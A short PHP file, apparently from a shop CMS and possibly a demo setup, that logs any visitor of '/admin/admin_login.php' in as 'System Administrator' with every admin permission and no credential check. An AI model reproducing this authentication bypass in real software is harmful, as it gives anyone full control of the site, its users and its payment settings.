<?php
if ($_SERVER['REQUEST_URI'] == "/admin/admin_login.php")
{
	set_session("session_admin_id", "3");
	set_session("session_admin_privilege_id", "1");
	set_session("session_admin_name", "System Administrator");
	$_SESSION['subuser'] = "SUBUSER_REPLACE";

	$permissions = array(
		'admin_users' => 1,
		'ads' => 1,
		'articles' => 1,
		'banners' => 1,
		'coupons' => 1,
		'custom_blocks' => 1,
		'filemanager' => 1,
		'forum' => 1,
		'import_export' => 1,
		'layouts' => 1,
		'newsletter' => 1,
		'orders_stats' => 1,
		'order_confirmation' => 1,
		'order_links' => 1,
		'order_notes' => 1,
		'order_profile' => 1,
		'order_serials' => 1,
		'order_statuses' => 1,
		'order_vouchers' => 1,
		'payment_systems' => 1,
		'polls' => 1,
		'products_categories' => 1,
		'products_reviews' => 1,
		'remove_orders' => 1,
		'sales_orders' => 1,
		'site_settings' => 1,
		'site_users' => 1,
		'static_tables' => 1,
		'support' => 1,
		'support_departments' => 1,
		'support_predefined_reply' => 1,
		'support_settings' => 1,
		'support_static_data' => 1,
		'support_ticket_close' => 1,
		'support_ticket_edit' => 1,
		'support_ticket_new' => 1,
		'support_ticket_reply' => 1,
		'support_users' => 1,
		'support_users_stats' => 1,
		'tax_rates' => 1,
		'update_orders' => 1,
		'web_pages' => 1
	);

	set_session("session_admin_permissions", $permissions);

	header("Location: ADF_admin.html");
	exit;
}
